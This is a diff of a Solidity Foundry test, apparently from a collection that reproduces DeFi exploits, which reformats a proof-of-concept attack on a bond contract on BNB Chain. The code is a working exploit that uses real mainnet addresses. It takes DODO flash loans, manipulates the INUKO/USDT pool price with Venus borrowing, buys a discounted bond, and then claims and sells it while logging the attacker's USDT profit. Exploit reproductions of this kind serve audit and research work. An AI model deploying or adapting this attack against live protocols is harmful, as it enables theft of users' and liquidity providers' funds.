@@ -14,60 +14,70 @@ import {IDVM} from "src/interfaces/IDVM.sol";
 // https://bscscan.com/txs?a=0xb12011c14e087766f30f4569ccaf735ec2182165
 
 interface Bond {
+
     function buyBond(uint256 lpAmount, uint256 bondId) external;
     function claim(uint256 index) external;
+
 }
 
 interface VBUSD {
+
     function mint(uint256 mintAmount) external;
     function redeemUnderlying(uint256 redeemAmount) external;
+
 }
 
 interface VBNB {
+
     function mint() external payable;
     function redeemUnderlying(uint256 redeemAmount) external;
+
 }
 
 interface VETH {
+
     function mint(uint256 mintAmount) external;
     function redeemUnderlying(uint256 redeemAmount) external;
+
 }
 
 interface VBTC {
+
     function mint(uint256 mintAmount) external;
     function redeemUnderlying(uint256 redeemAmount) external;
+
 }
 
 interface VUSDT {
+
     function borrow(uint256 borrowAmount) external;
     function repayBorrow(uint256 repayAmount) external;
+
 }
 
 interface Unitroller {
-    function getAccountLiquidity(
-        address account
-    ) external returns (uint256, uint256, uint256);
+
+    function getAccountLiquidity(address account) external returns (uint256, uint256, uint256);
     function enterMarkets(address[] calldata vTokens) external;
+
 }
 
 contract ContractTest is Test {
+
     IERC20 INUKO = IERC20(0xEa51801b8F5B88543DdaD3D1727400c15b209D8f);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
     IERC20 ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
     IERC20 BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
-    IUniswapV2Router Router =
-        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
-    IUniswapV2Pair Pair =
-        IUniswapV2Pair(0xD50B9Bcd8B7D4B791EA301DBCC8318EE854d8B67);
+    IUniswapV2Router Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    IUniswapV2Pair Pair = IUniswapV2Pair(0xD50B9Bcd8B7D4B791EA301DBCC8318EE854d8B67);
     VBNB vBNB = VBNB(0xA07c5b74C9B40447a954e1466938b865b6BBea36);
     VBUSD vBUSD = VBUSD(0x95c78222B3D6e262426483D42CfA53685A67Ab9D);
     VETH vETH = VETH(0xf508fCD89b8bd15579dc79A6827cB4686A3592c8);
     VBTC vBTC = VBTC(0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B);
     VUSDT vUSDT = VUSDT(0xfD5840Cd36d94D7229439859C0112a4185BC0255);
-    Unitroller unitroller =
-        Unitroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
+    Unitroller unitroller = Unitroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
     IERC20 token1;
     IERC20 token2;
     uint256 amount1;
@@ -102,7 +112,7 @@ contract ContractTest is Test {
     }
 
     function testExploit() public payable {
-        (bool sucess5, ) = address(WBNB).call{value: 5 ether}("");
+        (bool sucess5,) = address(WBNB).call{value: 5 ether}("");
         // add LP
         addLiquidity();
         // FlashLoan manipulate price, then buy bond
@@ -111,11 +121,7 @@ contract ContractTest is Test {
         vm.warp(block.timestamp + 3 * 24 * 60 * 60);
         claimAndSell();
 
-        emit log_named_decimal_uint(
-            "[End] Attacker USDT balance after exploit",
-            USDT.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
     }
 
     function addLiquidity() internal {
@@ -125,22 +131,14 @@ contract ContractTest is Test {
         path[1] = address(USDT);
         path[2] = address(INUKO);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WBNB.balanceOf(address(this)) / 2,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            WBNB.balanceOf(address(this)) / 2, 0, path, address(this), block.timestamp
         );
 
         address[] memory path1 = new address[](2);
         path1[0] = address(WBNB);
         path1[1] = address(USDT);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WBNB.balanceOf(address(this)),
-            0,
-            path1,
-            address(this),
-            block.timestamp
+            WBNB.balanceOf(address(this)), 0, path1, address(this), block.timestamp
         );
 
         USDT.approve(address(Router), type(uint256).max);
@@ -167,12 +165,10 @@ contract ContractTest is Test {
         IDVM(dodo1).flashLoan(amount1, amount2, address(this), new bytes(1)); //WBNB USDT
     }
 
-    function DPPFlashLoanCall(
-        address sender,
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        bytes calldata data
-    ) external payable {
+    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data)
+        external
+        payable
+    {
         if (msg.sender == dodo1) {
             WBNB_BUSD_Pair_Loan();
         } else if (msg.sender == dodo2) {
@@ -266,9 +262,7 @@ contract ContractTest is Test {
 
     function venusLendingAndRepay() public payable {
         uint256 BNBAmount = WBNB.balanceOf(address(this));
-        (bool success3, ) = address(WBNB).call(
-            abi.encodeWithSignature("withdraw(uint)", BNBAmount)
-        );
+        (bool success3,) = address(WBNB).call(abi.encodeWithSignature("withdraw(uint)", BNBAmount));
         uint256 BUSDAmount = BUSD.balanceOf(address(this));
         uint256 ETHAmount = ETH.balanceOf(address(this));
         uint256 BTCBAmount = BTCB.balanceOf(address(this));
@@ -286,7 +280,7 @@ contract ContractTest is Test {
         vETH.mint(ETHAmount);
         BTCB.approve(address(vBTC), type(uint256).max);
         vBTC.mint(BTCBAmount);
-        (, uint256 amount, ) = unitroller.getAccountLiquidity(address(this));
+        (, uint256 amount,) = unitroller.getAccountLiquidity(address(this));
 
         vUSDT.borrow((amount * 99) / 100);
         USDT.transfer(address(Pair), USDT.balanceOf(address(this)));
@@ -295,9 +289,7 @@ contract ContractTest is Test {
         USDT.approve(address(vUSDT), type(uint256).max);
         vUSDT.repayBorrow((amount * 99) / 100);
         vBNB.redeemUnderlying(BNBAmount);
-        (bool success2, ) = address(WBNB).call{value: address(this).balance}(
-            ""
-        );
+        (bool success2,) = address(WBNB).call{value: address(this).balance}("");
         vBUSD.redeemUnderlying(BUSDAmount);
         vETH.redeemUnderlying(ETHAmount);
         vBTC.redeemUnderlying(BTCBAmount);
@@ -311,27 +303,16 @@ contract ContractTest is Test {
         path[1] = address(USDT);
         // TX LIMIT
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            25_000 * 1e18,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            25_000 * 1e18, 0, path, address(this), block.timestamp
         );
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            25_000 * 1e18,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            25_000 * 1e18, 0, path, address(this), block.timestamp
         );
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            INUKO.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            INUKO.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
 
     receive() external payable {}
+
 }
